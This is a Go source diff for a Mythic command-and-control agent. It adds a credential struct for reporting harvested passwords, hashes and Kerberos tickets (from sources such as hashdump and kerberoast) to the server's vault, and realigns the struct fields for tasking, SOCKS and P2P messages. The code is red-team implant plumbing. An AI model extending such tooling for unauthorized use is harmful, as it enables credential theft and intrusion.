@@ -190,12 +190,13 @@ func FormatWorkingHoursTime(minutes int) string {
 
 // Task represents a task from Mythic
 type Task struct {
-	ID         string    `json:"id"`
-	Command    string    `json:"command"`
-	Params     string    `json:"parameters"`
-	Timestamp  time.Time `json:"timestamp"`
-	Job        *Job      `json:"-"` // Not marshalled to JSON
-	stopped    *int32    // Atomic flag for task cancellation; pointer so copies share state
+	ID        string    `json:"id"`
+	Command   string    `json:"command"`
+	Params    string    `json:"parameters"`
+	Timestamp time.Time `json:"timestamp"`
+	StartTime time.Time `json:"-"` // When the agent began executing this task
+	Job       *Job      `json:"-"` // Not marshalled to JSON
+	stopped   *int32    // Atomic flag for task cancellation; pointer so copies share state
 }
 
 // NewTask creates a Task with the stopped flag properly initialized
@@ -249,6 +250,16 @@ type ProcessEntry struct {
 	CommandLine     string `json:"command_line,omitempty"`
 }
 
+// MythicCredential represents a credential to store in Mythic's credential vault.
+// Included in the Response.Credentials array — Mythic automatically ingests these.
+type MythicCredential struct {
+	CredentialType string `json:"credential_type"` // "plaintext", "hash", "ticket", "key", "certificate"
+	Realm          string `json:"realm"`           // Domain/realm (e.g., "CONTOSO.LOCAL")
+	Account        string `json:"account"`         // Username
+	Credential     string `json:"credential"`      // The actual credential value (password, hash, ticket)
+	Comment        string `json:"comment"`         // Source info (e.g., "hashdump", "kerberoast")
+}
+
 // Response represents a response to Mythic
 type Response struct {
 	TaskID          string               `json:"task_id"`
@@ -257,6 +268,7 @@ type Response struct {
 	Completed       bool                 `json:"completed"`
 	ProcessResponse interface{}          `json:"process_response,omitempty"`
 	Processes       *[]ProcessEntry      `json:"processes,omitempty"`
+	Credentials     *[]MythicCredential  `json:"credentials,omitempty"`
 	Upload          *FileUploadMessage   `json:"upload,omitempty"`
 	Download        *FileDownloadMessage `json:"download,omitempty"`
 }
@@ -281,12 +293,12 @@ type FileDownloadMessage struct {
 
 // Job struct holds channels and state for task execution including file transfers
 type Job struct {
-	Stop                  *int
-	SendResponses         chan Response
-	SendFileToMythic      chan SendFileToMythicStruct
-	GetFileFromMythic     chan GetFileFromMythicStruct
-	FileTransfers         map[string]chan json.RawMessage
-	FileTransfersMu       sync.RWMutex
+	Stop              *int
+	SendResponses     chan Response
+	SendFileToMythic  chan SendFileToMythicStruct
+	GetFileFromMythic chan GetFileFromMythicStruct
+	FileTransfers     map[string]chan json.RawMessage
+	FileTransfersMu   sync.RWMutex
 }
 
 // SetFileTransfer safely adds a file transfer channel to the map
@@ -359,28 +371,29 @@ type SocksMsg struct {
 
 // CommandResult represents the result of executing a command
 type CommandResult struct {
-	Output    string
-	Status    string
-	Completed bool
-	Processes *[]ProcessEntry // Optional: populated by ps command for Mythic process browser
+	Output      string
+	Status      string
+	Completed   bool
+	Processes   *[]ProcessEntry     // Optional: populated by ps command for Mythic process browser
+	Credentials *[]MythicCredential // Optional: credentials to store in Mythic's credential vault
 }
 
 // DelegateMessage wraps a message to/from a linked P2P agent.
 // When sending to Mythic: Message is the base64-encoded encrypted data from the child.
 // When receiving from Mythic: Message is the base64-encoded encrypted data for the child.
 type DelegateMessage struct {
-	Message       string `json:"message"`        // Base64-encoded encrypted message
-	UUID          string `json:"uuid"`            // Target agent UUID (or temp UUID during staging)
-	C2ProfileName string `json:"c2_profile"`      // C2 profile name (e.g., "tcp")
+	Message       string `json:"message"`            // Base64-encoded encrypted message
+	UUID          string `json:"uuid"`               // Target agent UUID (or temp UUID during staging)
+	C2ProfileName string `json:"c2_profile"`         // C2 profile name (e.g., "tcp")
 	MythicUUID    string `json:"new_uuid,omitempty"` // Corrected UUID from Mythic after staging
 }
 
 // P2PConnectionMessage notifies Mythic about P2P link state changes (edges in the graph).
 type P2PConnectionMessage struct {
-	Source        string `json:"source"`         // Source callback UUID
-	Destination   string `json:"destination"`    // Destination callback UUID
-	Action        string `json:"action"`         // "add" or "remove"
-	C2ProfileName string `json:"c2_profile"`     // "tcp"
+	Source        string `json:"source"`      // Source callback UUID
+	Destination   string `json:"destination"` // Destination callback UUID
+	Action        string `json:"action"`      // "add" or "remove"
+	C2ProfileName string `json:"c2_profile"`  // "tcp"
 }
 
 // CheckinMessage represents the initial checkin message
@@ -401,11 +414,11 @@ type CheckinMessage struct {
 
 // TaskingMessage represents the message to get tasking
 type TaskingMessage struct {
-	Action      string             `json:"action"`
-	TaskingSize int                `json:"tasking_size"`
-	Socks       []SocksMsg         `json:"socks,omitempty"`
-	Rpfwd       []SocksMsg         `json:"rpfwd,omitempty"`
-	Delegates   []DelegateMessage  `json:"delegates,omitempty"`
+	Action      string            `json:"action"`
+	TaskingSize int               `json:"tasking_size"`
+	Socks       []SocksMsg        `json:"socks,omitempty"`
+	Rpfwd       []SocksMsg        `json:"rpfwd,omitempty"`
+	Delegates   []DelegateMessage `json:"delegates,omitempty"`
 	// Add agent identification for checkin updates
 	PayloadUUID string `json:"uuid,omitempty"`
 	PayloadType string `json:"payload_type,omitempty"`
